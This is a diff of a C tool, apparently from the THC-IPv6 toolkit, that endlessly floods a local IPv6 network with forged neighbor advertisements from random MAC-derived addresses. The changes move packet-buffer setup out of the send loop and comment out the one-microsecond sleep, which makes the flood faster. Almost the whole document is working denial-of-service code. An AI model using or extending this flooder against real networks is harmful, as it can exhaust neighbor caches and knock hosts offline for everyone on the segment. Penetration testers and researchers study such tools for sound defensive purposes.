@@ -13,10 +13,10 @@
 extern int debug;
 
 void help(char *prg) {
-  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("%s %s (c) 2011 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
   printf("Syntax: %s [-r] interface\n\n", prg);
   printf("Flood the local network with neighbor advertisements.\n");
-  printf("Use -r to use raw mode.\n\n");
+//  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
 
@@ -28,7 +28,7 @@ int main(int argc, char *argv[]) {
   int i;
   unsigned char *pkt = NULL;
   int pkt_len = 0, flags, rawmode = 0, count = 0;
-  
+
   if (argc < 2 || argc > 3 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
@@ -43,7 +43,7 @@ int main(int argc, char *argv[]) {
   setvbuf(stdout, NULL, _IONBF, 0);
 
   interface = argv[1];
-  
+
   ip6 = malloc(16);
 
   mac[0] = 0x00;
@@ -55,10 +55,16 @@ int main(int argc, char *argv[]) {
   ip6[9] = mac[1];
   ip6[11] = 0xff;
   ip6[12] = 0xfe;
+  memset(buf, 0, sizeof(buf));
+  buf[16] = 2;
+  buf[17] = 1;
+  buf[18] = mac[0];
+  buf[19] = mac[1];
+  memcpy(buf, ip6, 16);
 
   printf("Starting to flood network with neighbor advertisements on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
   while (1) {
-  
+
     for (i = 2; i < 6; i++)
       mac[i] = rand() % 256;
 
@@ -67,15 +73,12 @@ int main(int argc, char *argv[]) {
     ip6[13] = mac[3];
     ip6[14] = mac[4];
     ip6[15] = mac[5];
-    
+
     count++;
-    memset(buf, 0, sizeof(buf));
-    memcpy(buf, ip6, 16);
-    buf[16] = 2;
-    buf[17] = 1;
-    memcpy(&buf[18], mac, 6);
+    memcpy(buf + 10, ip6 + 10, 6);
+    memcpy(&buf[20], mac + 2, 4);
     flags = ICMP6_NEIGHBORADV_OVERRIDE;
-    
+
     if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
       return -1;
     if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, flags, buf, sizeof(buf), 0) < 0)
@@ -85,9 +88,9 @@ int main(int argc, char *argv[]) {
       perror("");
       return -1;
     }
-    
+
     pkt = thc_destroy_packet(pkt);
-    usleep(1);
+//    usleep(1);
     if (count % 100 == 0)
       printf(".");
   }
